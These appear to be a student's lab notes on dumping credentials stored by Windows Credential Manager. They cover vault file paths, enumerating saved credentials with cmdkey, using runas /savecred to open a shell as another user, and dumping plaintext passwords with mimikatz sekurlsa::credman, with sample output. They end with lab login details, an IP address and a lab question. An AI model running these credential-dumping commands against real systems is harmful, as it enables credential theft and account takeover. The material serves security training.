Feature that is built into Windows since Server 2008 R2 and Windows 7. Cred are stored in special encrypted folders on the computer under the user and system profiles:

- `%UserProfile%\\AppData\\Local\\Microsoft\\Vault\\`
- `%UserProfile%\\AppData\\Local\\Microsoft\\Credentials\\`
- `%UserProfile%\\AppData\\Roaming\\Microsoft\\Vault\\`
- `%ProgramData%\\Microsoft\\Vault\\`
- `%SystemRoot%\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Vault\\`

Each vault folder contains a Policy.vpol file that contains AES keys (AES-128 or AES-256), protected by DPAPI.

Different Types of Credential Lockers are as follows:

|**Name**|**Description**|
|---|---|
|Web Credentials|Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.|
|Windows Credentials|Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories.|

**Windows Vault Extraction:**

- It is possible to extract Windows vaults to a .crd file via Control Panel or with the following command. **Backups created are encrypted with a password!!**

`C:\\Users\\sadams>rundll32 keymgr.dll,KRShowKeyMgr`

![[Pasted image 20251028165428.png]]

## Enumerating credentials with cmdkey

- We can view the current credentials that are stored in the current user’s profile:

```bash
C:\\Users\\sadams>whoami
srv01\\sadams

C:\\Users\\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\\mcharles
    Type: Domain Password
    User: SRV01\\mcharles
```

- Stored credentials are listed with the following format:

|**Key**|**Value**|
|---|---|
|Target|The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.|
|Type|The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.|
|User|The user account associated with the credential.|
|Persistence|Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with `Local machine persistence` survive reboots.|

- Main thing to look at is this line right here: Target: Domain:interactive=SRV01\mcharles
    - We can see that we get the domain\user and also the keyword interactive, which means that we can get into an interactive shell using the “runas” command:

```bash
C:\\Users\\sadams>runas /savecred /user:SRV01\\mcharles cmd
Attempting to start cmd as user "SRV01\\mcharles" ...
```

## Tools:

- mimikatz
    - Using mimikatz, we can do a lot of things such as dump creds from memory using the sekurlsa, manually decrypt creds using the dpapi module.

```bash
C:\\Users\\Administrator\\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \\ / ##       > <https://blog.gentilkiwi.com/mimikatz>
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > <https://pingcastle.com> / <https://mysmartlogon.com> ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

...SNIP...

Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...

...SNIP...
```

"sadams" and password "totally2brow2harmon@

10.129.234.171

What is the password mcharles uses for OneDrive?